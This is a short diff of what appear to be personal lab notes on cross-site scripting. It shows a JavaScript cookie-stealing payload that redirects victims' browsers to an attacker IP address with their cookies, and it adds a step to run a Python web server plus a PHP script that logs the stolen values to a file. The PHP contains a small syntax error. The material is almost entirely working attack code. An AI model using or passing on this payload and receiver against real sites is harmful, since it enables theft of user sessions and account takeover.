@@ -18,3 +18,14 @@ Scraping Data, html
 
 HTTP Cookie Stealer (Java script):
   <script>document.location="http://10.50.38.82:8000/"+document.cookie;</script>
+ run on opstation: 
+  python3 -m http.server
+
+
+
+<?php
+$cookie = $_GET["username"]
+$steal = fopen("/var/www/html/uploads/cookiefile.txt", "a+");
+fwrite($steal, $cookie ."\n");
+fclose($steal);
+?>
